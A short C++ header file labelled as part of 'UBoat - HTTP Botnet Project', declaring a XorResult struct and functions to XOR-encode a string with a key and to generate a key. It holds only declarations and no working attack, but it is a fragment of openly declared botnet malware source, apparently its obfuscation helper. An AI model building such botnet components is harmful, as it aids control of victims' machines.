/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#ifndef __UBOAT_XOR_H
#define __UBOAT_XOR_H

#include <string>

typedef struct {
    std::string content;
    std::string key;
} XorResult;

std::string XORInputKey(const std::string& input, const std::string& key);
std::string GenerateKey(int lenght);

#endif // __UBOAT_XOR_H
